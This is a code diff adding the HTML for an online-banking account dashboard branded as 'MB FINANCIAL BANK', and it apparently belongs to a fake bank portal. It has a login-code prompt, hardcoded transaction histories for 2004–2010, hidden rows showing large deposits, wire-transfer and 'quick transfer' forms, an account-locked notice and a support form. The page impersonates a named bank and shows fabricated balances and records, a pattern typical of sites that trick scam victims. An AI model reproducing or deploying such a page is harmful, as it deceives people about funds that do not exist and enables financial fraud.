@@ -1,0 +1,2020 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    
+    <meta charset="utf-8">
+    <title>Account | PERSONAL BANKING, CORPORATE BANKING, ONLINE BANKING</title>
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <link rel="icon" href="../i/logo.png">
+
+    <!-- GOOGLE SERVICES -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <!-- Compiled and minified CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+          
+    <!-- Compiled and minified JavaScript -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <!-- LINKS -->
+    <link rel="stylesheet" href="css/master.css">
+    <link rel="stylesheet" href="ACC1.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://embed.tawk.to/_s/v4/app/642b759ae8c/js/twk-main.js" charset="UTF-8" crossorigin="*"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-firestore.js"></script>
+
+    
+
+  </head>
+
+
+  <body>
+    <div class="verify_code hide">
+      <div class="verifyCard">
+        <div class="symb_1">
+          <i class="material-icons">person_pin</i>
+        </div>
+        <div class="symb_2">
+          <span class="veri_txt">
+            Please enter login code to verify 
+            authentication
+          </span>
+        </div>
+        <div class="symb_3">
+          <span class="veri_txt_src">
+            A login code has been sent to ******789
+          </span>
+        </div>
+        <div class="symb_4">
+          <input type="text" id="verification_code_input">
+              <!-- loaders -->
+          <div class="verification_loader_bx hide">
+            <div class="preloader-wrapper big active">
+              <div class="spinner-layer spinner-blue-only">
+                <div class="circle-clipper left">
+                  <div class="circle"></div>
+                </div><div class="gap-patch">
+                  <div class="circle"></div>
+                </div><div class="circle-clipper right">
+                  <div class="circle"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="error_txt red-text"></span>
+        </div>
+        <div class="symb_5">
+          <a class="btn blue" id="verification_code_btn"  onclick="verifyCode();">Sign In</a>
+        </div>
+        <div class="symb_6">
+          <span>This is asked since 2FA is enabled for your account. To resend code. </span>
+          <a class="veri_loginAgain_btn" onclick="LOGOUT_USER();">Login again</a>
+        </div>  
+      </div>
+
+      
+    </div>
+
+    
+    <!-- GOD BLESS PLANET EARTH -->
+    <!-- 1.0 - july23 -->
+    <DIV class="ACCOUNT_1 hide">
+
+      <!-- ACTIVITY HISTORY  -->
+      <div class="transaction-history hide">
+        <i class="close-transaction-history material-icons" onclick="closeTransactionHistory();">close</i>
+       
+       
+       <!-- UPDATE 25  -->
+       
+       
+       
+       <!-- bomb -->
+       <table class="striped">
+        <div class="years">
+
+        </div>
+        <thead>
+          <tr>
+              <th>YEAR</th>
+              <th> </th>
+              <th>2010</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td>1/3/2010</td>
+            <td>Valencia Irby</td>
+            <td>12,000.00</td>
+          </tr>
+          <tr>
+            <td>2/04/2010</td>
+            <td>Edenway Constructors</td>
+            <td>24,000.00</td>
+          </tr>
+        </tbody>
+
+        <tbody class="hide">
+          <tr>
+            <td>2024-02-23</td>
+            <td>Funds Deposited</td>
+            <td>$731,000,00</td>
+          </tr>
+
+          <tr>
+            <td>2024-02-28</td>
+            <td>Debit transaction  - Oceanwave logistics</td>
+            <td>$65,000,00</td>
+          </tr>
+          
+        </tbody>
+      </table>
+        <!-- year 2009 -->
+        <table class="striped">
+          <div class="years">
+
+          </div>
+          <thead>
+            <tr>
+                <th>YEAR</th>
+                <th> </th>
+                <th>2009</th>
+            </tr>
+          </thead>
+
+          <tbody>
+            <tr>
+              <td>12/31/2009</td>
+              <td>Britil LLC</td>
+              <td>12,000.00</td>
+            </tr>
+            <tr>
+              <td>12/06/2009</td>
+              <td>Edenway Constructors</td>
+              <td>24,000.00</td>
+            </tr>
+            <tr>
+              <td>12/03/2009</td>
+              <td>The O'Keefe Group</td>
+              <td>14,890.00</td>
+            </tr>
+            <tr>
+              <td>12/01/2009</td>
+              <td>Cash Deposit - Joel David Glover</td>
+              <td>14,890.00</td>
+            </tr>
+            <tr>
+              <td>11/29/2009</td>
+              <td>Zale Ltd</td>
+              <td>14,158.00</td>
+            </tr>
+            <tr>
+              <td>11/25/2009</td>
+              <td>Garryfield Fitness</td>
+              <td>25,000.00</td>
+            </tr>
+            <tr>
+              <td>11/23/2009</td>
+              <td>TMPL GYM</td>
+              <td>35,130.00</td>
+            </tr>
+            <tr>
+              <td>11/20/2009</td>
+              <td>Ripped Fitness Ltd</td>
+              <td>41,770.00</td>
+            </tr>
+            <tr>
+              <td>11/18/2009</td>
+              <td>Walsall Ltd</td>
+              <td>13,140.00</td>
+            </tr>
+            <tr>
+              <td>11/11/2009</td>
+              <td>Ripped Fitness Ltd</td>
+              <td>37,360.00</td>
+            </tr>
+            <tr>
+              <td>11/09/2009</td>
+              <td>Zale, Ltd</td>
+              <td>31,000.00</td>
+            </tr>
+            <tr>
+              <td>11/05/2009</td>
+              <td>Lincoln Groups</td>
+              <td>66,660.00</td>
+            </tr>
+            <tr>
+              <td>11/01/2009</td>
+              <td>Cash Deposit - Joel David Glover</td>
+              <td>14,000.00</td>
+            </tr>
+            <tr>
+              <td>10/31/2009</td>
+              <td>Sage LLC</td>
+              <td>47,000.00</td>
+            </tr>
+            <tr>
+              <td>10/29/2009</td>
+              <td>The Warehouse Gym</td>
+              <td>33,790.00</td>
+            </tr>
+            <tr>
+              <td>10/25/2009</td>
+              <td>Frontline Fit Performance Centre</td>
+              <td>22,180.00</td>
+            </tr>
+            <tr>
+              <td>10/14/2009</td>
+              <td>Synergy Group Fitness</td>
+              <td>57,700.00</td>
+            </tr>
+            <tr>
+              <td>10/09/2009</td>
+              <td>Synergy Group Fitness</td>
+              <td>15,500.00</td>
+            </tr>
+            <tr>
+              <td>10/01/2009</td>
+              <td>Cash Deposit - Joel David Glover</td>
+              <td>10,000.00</td> 
+            </tr>
+          </tbody>
+  
+          <tbody class="hide">
+            <tr>
+              <td>2024-02-23</td>
+              <td>Funds Deposited</td>
+              <td>$731,000,00</td>
+            </tr>
+
+            <tr>
+              <td>2024-02-28</td>
+              <td>Debit transaction  - Oceanwave logistics</td>
+              <td>$65,000,00</td>
+            </tr>
+            
+          </tbody>
+        </table>
+
+        <!-- year 2008 -->
+        <table class="striped">
+          <thead>
+            <tr>
+                <th>YEAR</th>
+                <th> </th>
+                <th>2008</th>
+            </tr>
+          </thead>
+  
+          <tbody>
+            <tr>
+              <td>12/29/2008</td>
+              <td>New York Underground LLC</td>
+              <td>8,000.00</td>
+            </tr>
+            <tr>
+              <td>12/15/2008</td>
+              <td>Chelsea Piers LLC</td>
+              <td>8,000.00</td>
+            </tr>
+            <tr>
+              <td>12/08/2008</td>
+              <td>TMPL GYM</td>
+              <td>4,500.00</td>
+            </tr>
+            <tr>
+              <td>11/11/2008</td>
+              <td>Lisa Jetkins</td>
+              <td>10,550.00</td>
+            </tr>
+            <tr>
+              <td>11/09/2008</td>
+              <td>Zale, Ltd</td>
+              <td>20,000.00</td>
+            </tr>
+            <tr>
+              <td>11/06/2008</td>
+              <td>Fabindia, Ltd</td>
+              <td>80,000.00</td>
+            </tr>
+            <tr>
+              <td>11/03/2008</td>
+              <td>Hannoush Destiny</td>
+              <td>15,022.00</td>
+            </tr>
+            <tr>
+              <td>11/01/2008</td>
+              <td>Conwell J.P, Ltd</td>
+              <td> 20,120.00</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- year 2007 -->
+        <table class="">
+          <thead>
+            <tr>
+                <th>YEAR</th>
+                <th> </th>
+                <th>2007</th>
+            </tr>
+          </thead>
+  
+          <tbody>
+            <tr>
+              <td>12/27/2007</td>
+              <td>Oceanwave Logistics</td>
+              <td>32,000.00</td>
+            </tr>
+            <tr>
+              <td>12/13/2007</td>
+              <td>XchangeStocks</td>
+              <td>4,700.00</td>
+            </tr>
+            <tr>
+              <td>12/11/2007</td>
+              <td>Hannoush Destiny</td>
+              <td>40,000.00</td>
+            </tr>
+            <tr>
+              <td>11/11/2007</td>
+              <td>Wil&CO Center</td>
+              <td>23,330.00</td>
+            </tr>
+            <tr>
+              <td>11/10/2007</td>
+              <td>Dex Power</td>
+              <td>65,330.00</td>
+            </tr>
+            <tr>
+              <td>11/08/2007</td>
+              <td>Fabindia, Ltd</td>
+              <td>76,000.00</td>
+            </tr>
+            <tr>
+              <td>11/05/2007</td>
+              <td>Hannoush Destiny</td>
+              <td>6,050.00</td>
+            </tr>
+            <tr>
+              <td>11/02/2007</td>
+              <td>24HRS LLC NY.</td>
+              <td> 66,550.00</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- year 2006 -->
+        <table>
+          <thead>
+            <tr>
+                <th>YEAR</th>
+                <th> </th>
+                <th>2006</th>
+            </tr>
+          </thead>
+  
+          <tbody>
+            <tr>
+              <td>12/30/2006</td>
+              <td>Paul & Co</td>
+              <td>15,300.00</td>
+            </tr>
+            <tr>
+              <td>12/28/2006</td>
+              <td>TMPL GYM</td>
+              <td>4,700.00</td>
+            </tr>
+            <tr>
+              <td>12/22/2006</td>
+              <td>Sage LLC</td>
+              <td>40,000.00</td>
+            </tr>
+            <tr>
+              <td>11/29/2006</td>
+              <td>Joan Camb</td>
+              <td>38,330.00</td>
+            </tr>
+            <tr>
+              <td>11/25/2006</td>
+              <td>24HRS LLC NJ</td>
+              <td>40,550.00</td>
+            </tr>
+            <tr>
+              <td>11/15/2006</td>
+              <td>Fabindia, Ltd</td>
+              <td>20,000.00</td>
+            </tr>
+            <tr>
+              <td>11/09/2006</td>
+              <td>Liptils Realty</td>
+              <td>34,500.00</td>
+            </tr>
+            <tr>
+              <td>11/05/2006</td>
+              <td>Dant LLC</td>
+              <td> 16,970.00</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- year 2005 -->
+        <table>
+          <thead>
+            <tr>
+                <th>YEAR</th>
+                <th> </th>
+                <th>2005</th>
+            </tr>
+          </thead>
+  
+          <tbody>
+            <tr>
+              <td>12/30/2005</td>
+              <td>Chelsea Piers LLC</td>
+              <td>9,300.00</td>
+            </tr>
+            <tr>
+              <td>12/28/2005</td>
+              <td>Lisa Jetkins</td>
+              <td>8,800.00</td>
+            </tr>
+            <tr>
+              <td>12/22/2005</td>
+              <td>Sage LLC</td>
+              <td>15,400.00</td>
+            </tr>
+            <tr>
+              <td>11/29/2005</td>
+              <td>Fabindia</td>
+              <td>12,670.00</td>
+            </tr>
+            <tr>
+              <td>11/25/2005</td>
+              <td>New York Underground LLC</td>
+              <td>67,000.00</td>
+            </tr>
+            <tr>
+              <td>11/15/2005</td>
+              <td>Sage LLC</td>
+              <td>78,500.00</td>
+            </tr>
+            <tr>
+              <td>11/09/2005</td>
+              <td>Mac And Co. Logistics</td>
+              <td>4,780.00</td>
+            </tr>
+            <tr>
+              <td>11/05/2005</td>
+              <td>Ludlow LLC</td>
+              <td> 9,850.00</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- year 2004 -->
+        <table>
+          <thead>
+            <tr>
+                <th>YEAR</th>
+                <th> </th>
+                <th>2004</th>
+            </tr>
+          </thead>
+  
+          <tbody>
+            <tr>
+              <td>12/28/2004</td>
+              <td>Jen Myers</td>
+              <td>400.00</td>
+            </tr>
+            <tr>
+              <td>12/26/2004</td>
+              <td>Lisa Jetkins</td>
+              <td>8,800.00</td>
+            </tr>
+            <tr>
+              <td>12/23/2004</td>
+              <td>Sage LLC</td>
+              <td>15,400.00</td>
+            </tr>
+            <tr>
+              <td>11/19/2004</td>
+              <td>Hannoush Destiny</td>
+              <td>55,111.00</td>
+            </tr>
+            <tr>
+              <td>11/17/2004</td>
+              <td>Zale, Ltd</td>
+              <td>12,300.00</td>
+            </tr>
+            <tr>
+              <td>11/13/2004</td>
+              <td>The Gym Way</td>
+              <td>34,000.00</td>
+            </tr>
+            <tr>
+              <td>11/11/2004</td>
+              <td> Gymbox Covent Garden </td>
+              <td> 13,550.00</td>
+            </tr>
+            <tr>
+              <td>11/08/2004</td>
+              <td>Pure Gym</td>
+              <td> 13,050.00</td>
+            </tr>
+            <tr>
+              <td>11/06/2004</td>
+              <td>The Gym Group</td>
+              <td> 44,130.00</td>
+            </tr>
+            <tr>
+              <td>11/03/2004</td>
+              <td>The O’Keefe Group</td>
+              <td> 30,200.00</td>
+            </tr>
+            <tr>
+              <td>11/02/2004</td>
+              <td>Elliott Wood</td>
+              <td> 15,350.00</td>
+            </tr>
+            <tr>
+              <td>11/01/2004</td>
+              <td>Edenway Contractors</td>
+              <td> 70.000.00</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div class="activity_card hide">
+          <ul class="collapsible">
+              <li class="active">
+                <div class="collapsible-header"><i class="material-icons">access_time</i>YEAR (2023)</div>
+                <div class="collapsible-body activity_section">
+                  <ul>
+                    <li>
+                      <div class="row transaction_history">
+                        <div class="col s1">
+                          <i class="material-icons">check</i>
+                        </div>
+                        <div class="col s8">
+                          <span class="flow-text">
+                            Direct Deposit 
+                          </span>
+                          <span class="grey-text">
+                            Your account has been credited with an amount of $350,320.00
+                          </span>
+                          <span class="grey-text">
+                            01 March 2021, 02:04 PM
+                          </span>
+                        </div>
+                        <div class="col s2">
+                          <span class="flow-text">350,320.00</span>
+                        </div>
+                      </div>
+                    </li>
+                  </ul>
+                </div>
+              </li>
+          </ul>
+        </div>
+      </div>
+      <!-- // bomb -->
+
+      <!-- REPORT PAGE -->
+      <div class="report_page hide">
+        <div class="mdl_bx">
+          <!-- <span class="report_title blue-text">Get In Touch</span> -->
+          <div class="row">
+            <div class="col m4 s12">
+              <div class="card report_card_1 blue">
+                <div class="rc1_title">
+                  <span>MB FINANCIAL BANK CUSTOMER CARE</span>
+                  <hr>
+                </div>
+                <div>
+                  <p>
+                    Fill out the form below to be in touch with us about 
+                    your account being locked,
+                    suspended, or having certain features limited. If you 
+                    are attempting to submit for other support options,
+                    you'll need to specify your problem here.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div class="col m8 s12" id="report_page_form">
+              <div class="report_card_bhx card  white">
+                <div class="row">
+                  <form class="col s12">
+                    <div class="row">
+                      <div class="input-field col m6 s12">
+                        <i class="material-icons prefix">account_circle</i>
+                        <input id="report_name_txt" type="text" class="validate">
+                        <label for="report_name_txt">Name</label>
+                      </div>
+                      <div class="input-field col m6 s12">
+                        <i class="material-icons prefix">phone</i>
+                        <input id="report_telephone" type="tel" class="validate">
+                        <label for="report_telephone">Telephone</label>
+                      </div>
+                    </div>
+
+                    <div class="row">
+                      <div class="input-field col s12">
+                        <i class="material-icons prefix">email</i>
+                        <input id="report_email_txt" type="text" class="validate">
+                        <label for="report_email_txt">Email</label>
+                      </div>
+                      <div class="input-field col s12">
+                        <i class="material-icons prefix">comment</i>
+                        <textarea name="" id="report_message_txt" cols="30" rows="10">
+
+                        </textarea>
+
+                        <p class="error_report_text red-text"></p>
+                      </div>
+                    </div>
+
+                    <div class="play_final_bhxxx">
+
+                    </div>
+
+                    <div class="report_send_btn">
+                      <div class="row">
+                        <div class="col s6">
+                          <a class="btn blue" onclick="sendReportMessage();">Send Message</a>
+                        </div>
+                        <div class="col s6">
+                          <a class="btn grey" onclick="closeReports();">Cancel</a>
+                        </div>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+                <div>
+                  <ul class="rc1_contact_bx">
+                    <li>
+                      <i class="material-icons  rbx11">add_location</i>
+                      <span class="rbx1">
+                        3030 E 92nd St, Chicago
+                      </span>
+                    </li>
+
+                    <li>
+                      <i class="material-icons  rbx11">mail</i>
+                      <span class="rbx1">
+                        contact@mbfbanking.com
+                      </span>
+                    </li>
+
+                    <li>
+                      <i class="material-icons  rbx11">phone</i>
+                      <span class="rbx1">
+                        +1 660 7896 542
+                      </span>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- YOUR REPORT HAS BEEN DELIVERED -->
+        <div class="report_sent_page">
+
+        </div>
+      </div>
+
+      <!-- make a transfer -->
+      <div class="transfer_card hide">
+        <div class="backBX hide">
+          <a onclick="hideTransferPage();">
+            <i class="material-icons left">arrow_back</i>
+            <span>Back</span>
+          </a>
+        </div>
+        <!-- update 2023 june 08 --contents -->
+        <div class="SEND_CARD_BX">
+          
+          <div id="SCBX1">
+              <i class="material-icons left imgg symb1 grey-text">send</i>
+              <span class="BX_TITLE">Send Money</span>
+              
+              <i class="material-icons right" onclick="close_transfer_section();" id="send_money_close_btn">close</i>
+          </div>
+
+          <DIV class="loaderBX hide">
+            <div class="preloader-wrapper big active loaderbx_1">
+              <div class="spinner-layer spinner-blue-only">
+                <div class="circle-clipper left">
+                  <div class="circle"></div>
+                </div><div class="gap-patch">
+                  <div class="circle"></div>
+                </div><div class="circle-clipper right">
+                  <div class="circle"></div>
+                </div>
+              </div>
+            </div>
+          </DIV>
+
+          <div id="form_bx" class="SCBX2 send_transfer_form">
+
+            
+
+            <div class="row SCBX3">
+
+              <div class="receiver_information_bx ">
+                <br>
+
+            <div class="row hide">  
+              <div class="col s3 input_field">
+                <label for="input_text">Currency</label>
+                <input id="which_currency" type="text" data-length="10" disabled>
+              </div>
+
+              <div class="col s8 input_field">
+                <label for="input_text">From</label>
+                <input id="from_which_acc" type="text" data-length="10" value="Savings account" disabled>
+              </div>
+            </div>
+                <div class="col s11 input_field">
+                  <label for="input_text">To</label>
+                  <input id="receiver_name_input" type="text"  placeholder="Recipient's Full Name">
+                  <div class="errorBX"> <span class="e_txt" id="e_receiverName"></span> </div>
+                </div>
+  
+                <div class="col s11 input_field">
+                  <label for="input_text">Bank account number</label>
+                  <input id="bank_number_input" type="text"  placeholder="Recipient's Bank Account Number ">
+                  <div class="errorBX"> <span class="e_txt" id="e_bankNumber"></span> </div>
+                </div> 
+
+                <div class="col s11 input_field">
+                  <label for="input_text">Bank routing number</label>
+                  <input id="bank_routing_input" type="text"  placeholder="Recipient's Bank Routing Number ">
+                  <div class="errorBX"> <span class="e_txt" id="e_bankNumber"></span> </div>
+                </div> 
+  
+                <div class="col s11 input_field">
+                  <label for="input_text">Purpose of transfer</label>
+                  <textarea id="purposeOfTransfer_input" class="materialize-textarea" cols="30" rows="10"></textarea>
+                </div>
+              </div>
+
+
+              <div class="bank_information_bx hide">
+                <div class="col s12 input_field">
+                  <label for="input_text">Bank name</label>
+                  <input id="bank_name_input" type="text"  placeholder="Recipient's Bank Name">
+                  <div class="errorBX"> <span class="e_txt" id="e_bankName"></span> </div>
+                </div>
+  
+                <div class="col s12 input_field">
+                  <label for="input_text">Bank address</label>
+                  <input id="bank_address_input" type="text"  placeholder="Recipient's Bank/Branch Address">
+                  <div class="errorBX"> <span class="e_txt" id="e_bankAddress"></span> </div>
+                </div>
+
+                <div class="col s12 input_field">
+                  <label for="input_text">Bank Identifier</label>
+                  <input id="bank_identifier_input" type="text"  placeholder="Recipient's Bank/Branch Identifier  (e.g., BIC/SWIFT code)">
+                  <div class="errorBX"> <span class="e_txt" id="e_bankIdentifier"></span> </div>
+                </div>
+
+                <div class="col s12 input_field">
+                  <label for="input_text">Amount</label>
+                  <input id="bank_amount" type="text" >
+                  <div class="errorBX"> <span class="e_txt" id="e_amount"></span> </div>
+                </div>
+
+                <div class="transfer_money_btn">
+                  <a class="btn grey wire_money_send_btn" onclick="check_all_inputs(1);">Send</a>
+                </div>
+              </div>
+
+              
+
+              
+            </div>
+
+            <div class="SCBX4 sed_money_form_btn_bx">
+              <a class="btn xxclr1 wire_money_continue_btn" onclick="check_all_inputs(0);">Continue</a>
+            </div>
+          </div>
+
+          <div class="confirm_this_transfer_bx hide">
+            <div class="confirm_transfer_info">
+              <p>
+                Before proceeding with the wire transfer, kindly double-check all 
+                the provided information to ensure its accuracy
+              </p>
+            </div>
+            <div class="row">
+              <form class="col s12">
+                <div class="row">
+                  <div class="input-field col s6">
+                    <i class="material-icons prefix">assignment_ind</i>
+                    <textarea id="icon_receiver_name" class="materialize-textarea" disabled>   </textarea>
+                    <label for="icon_receiver_name">Receiver name</label>
+                  </div>
+
+                  <div class="input-field col s6">
+                    <i class="material-icons prefix">payment</i>
+                    <textarea id="icon_accountNumber" class="materialize-textarea" disabled>  </textarea>
+                    <label for="icon_accountNumber">Bank account #</label>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="input-field col s6">
+                    <i class="material-icons prefix">assignment_ind</i>
+                    <textarea id="icon_bank" class="materialize-textarea" disabled>     </textarea>
+                    <label for="icon_bank">Bank name</label>
+                  </div>
+
+                  <div class="input-field col s6">
+                    <i class="material-icons prefix">add_location</i>
+                    <textarea id="icon_location" class="materialize-textarea" disabled>     </textarea>
+                    <label for="icon_location">Bank address</label>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="input-field col s6">
+                    <i class="material-icons prefix">attach_money</i>
+                    <textarea id="icon_amount" class="materialize-textarea" disabled>   </textarea>
+                    <label for="icon_bank">Amount</label>
+                  </div>
+
+                </div>
+              </form>
+              
+            </div>
+
+            <div class="row" id="confirm_transfer_bx">
+              <div class="s12">
+                <a class="grey btn" id="confirn_transfer_btn" onclick="CONFIRM_TRANSFER();">Confirm</a>
+              </div>
+              <div class="s12">
+                <a class="red btn" id="cancel_transfer_btn" onclick="CANCEL_TRANSFER();">Go back</a>
+              </div>
+            </div>
+
+            <div class="transfer_verification_processing tvp_bx transfer_ui3 hide">
+              <div class="preloader-wrapper big active loader_ide_1">
+                <div class="spinner-layer spinner-blue-only">
+                  <div class="circle-clipper left">
+                    <div class="circle"></div>
+                  </div><div class="gap-patch">
+                    <div class="circle"></div>
+                  </div><div class="circle-clipper right">
+                    <div class="circle"></div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="please_wait_while_we_verify pwwwv_bx">
+                <p>
+                   
+                </p>
+              </div>
+            </div>
+
+            <div class="transfer_successful_bx transfer_ui4 hide">
+              <i class="material-icons blue-text" id="tsbx_btn">beenhere</i>
+
+              <div class="message_prompt">
+                <p>
+                  We are pleased to inform you that your recent bank transfer has been successfully completed. 
+                </p>
+              </div>
+
+              <a class=""></a>
+            </div>
+
+          </div>
+        </div>
+        <!-- //make a transfer -->
+
+        <div class="wire_card hide">
+          
+          <br><br>
+          <div class="row">
+            <form class="col s12">
+              <div class="row">
+                <div class="input-field col s12">
+                  <i class="material-icons prefix">account_balance</i>
+                  <input id="bankInp_name" type="text" class="transfer_inputs">
+                  <label for="bankInp_name">Bank Name</label>
+                </div>
+              </div> 
+
+              <div class="row">
+                <div class="input-field col s12">
+                  <i class="material-icons prefix">add_location</i>
+                  <input id="bankInp_address" type="text" class="transfer_inputs">
+                  <label for="bankInp_address">Bank Address</label>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="input-field col s12">
+                  <i class="material-icons prefix">account_circle</i>
+                  <input id="bankInp_receiver_name" type="text" class="transfer_inputs">
+                  <label for="bankInp_receiver_name">Receiver's Name</label>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="input-field col s12">
+                  <i class="material-icons prefix">account_balance_wallet</i>
+                  <input id="bankInp_account_number" type="text" class="transfer_inputs">
+                  <label for="bankInp_account_number">Account Number</label>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="input-field col s12">
+                  <i class="material-icons prefix">card_membership</i>
+                  <input id="bankInp_routing_number" type="text" class="transfer_inputs">
+                  <label for="bankInp_routing_number">Routing Number</label>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="input-field col s6">
+                  <i class="material-icons prefix">account_circle</i>
+                  <input id="bankInp_swift" type="text" class="transfer_inputs">
+                  <label for="bankInp_swift">Swift Code</label>
+                </div>
+                <div class="input-field col s6">
+                  <i class="material-icons prefix">attach_money</i>
+                  <input id="bankInp_amount" type="text" class="transfer_inputs">
+                  <label for="bankInp_amount">Amount</label>
+                </div>
+              </div>
+
+              <span class="transfer_error"></span>
+            </form>
+           
+          </div>
+          <br><br>
+          <div class="transfer_send_bx tsbx">
+            <a class="btn teal" onclick="TRANSFER_FUNDS();" id="transfer_funds_btn">Send</a>
+          </div>
+
+        </div>
+      </div>
+      <div class="acc_container">  
+        <div class="acc_info_bx"></div>
+        <div class="acc_content accnt_1">
+          <div class="bnk_logo_bx">
+            <img src="mbflg.png" alt="">
+            
+          </div>
+          <div class="menu_link_bx">
+            <ul class="mlbx">
+              <li id="overview_bb">
+                <i class="material-icons">dashboard</i>
+                <span>Overview</span>
+              </li>
+
+              <li onclick="open_transfer_section();" id="menu_transfer_bb">
+                <i class="material-icons">attach_money</i>
+                <span>Make a transfer</span>
+              </li>
+
+              <li onclick="openTransactionHistory();" class="transaction-history-ui hide" id="menu_transaction_history">
+                <i class="material-icons">import_contacts</i>
+                <span>Transactions</span>
+              </li> 
+
+              <li onclick="openReports();" id="menu_report_bb">
+                <i class="material-icons" >report_problem</i>
+                <span>Reports </span>
+              </li>
+
+              <li onclick="LOGOUT_USER();">
+                <i class="material-icons">first_page</i>
+                <span>Sign out</span>
+              </li>
+
+
+            </ul>
+          </div>
+
+          <div class="client_notice_bx">
+            <img src="piggy.png" alt="">
+            <div class="bnkPST">
+              <span class="bld1">Congratulations!</span>
+              <p>
+                You're eligible for instant Life Cover 
+                upto 2,000,000 without any medical test for 
+                documention
+              </p>
+            </div>
+            <div class="bld1_btn_bx">
+              <a class="">BUY NOW</a>
+            </div>
+          </div>
+        </div>
+        <!-- MAIN CONTENT SCREEN -->
+        <div class="acc_content accnt_2 overview_views hide">
+          <div class="glassBlur hide"></div>
+          <i class="material-icons menu_ctx" onclick="menu();">dehaze</i>
+          <div class="intro_bx">
+            <span id="overview_txt">Overview</span>
+            <span id="gnrl_txt">
+              Hi <span class="userFirstName"></span>,
+              welcome back!
+            </span>
+          </div>
+
+          <div class="balance_bx forSavingsOnly">
+            <span class="balance_card">
+              <span id="balance_txt">YOUR BALANCE</span>
+              <span class="input_balance">$0.00</span>
+              <span class="savings_business_account" onclick="showBankAccountNumber();">Savings A/C *******3234</span>
+              <br>
+              <span class="red-text account_locked_txt" id="account_locked_txt"></span>
+              <span class="grey-text" id="account_address_txt"></span>
+            </span>
+          </div>
+          <br>
+          <!-- RECENT TRANSACTIONS -->
+              <!-- CURRENT ACCOUNT -->
+              
+          <div class="recent_transaction_bx forSavingsOnly">
+            
+            <ul class="rtbx_ul">
+              <span id="recntTransaction_txt">
+                Recent transaction
+              </span>
+
+              <hr>
+              <div id="recent_transaction_bx">
+
+              </div>
+
+              <li class="row hide">
+                <span class="col s2">
+                  <i class="material-icons left red-text">arrow_back</i>
+                </span>
+                <span class="col s7 tdets">
+                  <span class="transaction_details">
+                    Transfer made to James Owen
+                  </span>
+                </span>
+                <span class="col s3  dateAndAmountBX">
+                  <span class="transaction_amount_new">
+                    $450.00
+                  </span>
+                  <span class="transaction_date_new">
+                    Janaury 31, 2023
+                  </span>
+                </span>
+              </li>
+              <hr>
+              <li class="row hide">
+                <span class="col s2">
+                  <i class="material-icons left green-text">arrow_forward</i>
+                </span>
+                <span class="col s7 tdets">
+                  <span class="transaction_details">
+                    Transfer received from CreditUnion AU
+                  </span>
+                </span>
+                <span class="col s3  dateAndAmountBX">
+                  <span class="transaction_amount_new">
+                    $450.00
+                  </span>
+                  <span class="transaction_date_new">
+                    Janaury 31, 2023
+                  </span>
+                </span>
+              </li>
+              <hr>
+            </ul>
+          </div>
+          <!-- //RECENT TRANSACTIONS -->
+
+        </div>
+        <div class="acc_content accnt_3 overview_views hide">
+          <div class="quick_transfer_card">
+            <div class="qtc_content">
+              <span class="qtc_title">QUICK TRANSFER</span>
+              <div class="row qtc_via">
+                <a class="via_mobile qtca_active" onclick="send_via_mobile();">VIA MOBILE NO.</a>
+                <a class="via_account" onclick="send_via_acc();">VISA ACCOUNT NO.</a>
+              </div>
+
+              <div class="row" id="account_tel_input_bx">
+                <div class="col s3 qt_lines">
+                  <span>+1</span>
+                </div>
+                <div class="col s7">
+                  <span id="tel_transfer">
+                    <input type="text" value="99806 12345">
+                  </span>
+                </div>
+              </div>
+
+              <div class="row hide" id="account_number_input_bx">
+                <div class="col s3 qt_lines">
+                  <span>ACC#</span>
+                </div>
+                <div class="col s7">
+                  <span id="tel_transfer">
+                    <input type="text" value="">
+                  </span>
+                </div>
+              </div>
+
+              <div class="row vxz1">
+                <div class="col s1">
+                  <span id="transfer_currency">$</span>
+                </div>
+                <div class="col s8">
+                  <span id="quick_transfer_amount">
+                   
+                    <input id="quick_transfer_amount_input" type="text" value="32,500.00">
+                  </span>
+
+                </div>
+                <div class="col s2">
+                  <span id="quick_transfer_symbol">USD</span>
+                </div>
+              </div>
+              <hr>
+            </div>
+            <div class="qtc_content_error">
+              <p> 
+                To protect your account from unauthorized transfers, you have chosen to disable your MBID feature.
+                 <span class="blue-text">Enable now</span>
+              </p>
+            </div>
+            <div class="qck_transfer_btn_bx">
+              <a class="btn qck_transfer_btn" onclick="quick_transfer();">
+                SEND TO VICTORIA
+              </a>
+              <i class="ldr_report hide fa fa-spinner fa-spin"></i>
+            </div>
+          </div>
+        </div>
+
+        <div class="acc_content accnt_4 report_views hide">
+          <div class="acc4_page">
+            <div class="qtc_content">
+              <br>
+              <span class="qtc_title">
+                Get In Touch With Us
+              </span>
+              <br>
+              <div class="row">
+                <div class="col s6 m3 getInTouchBX">
+                  <i class="material-icons">add_location</i>
+                  <div>
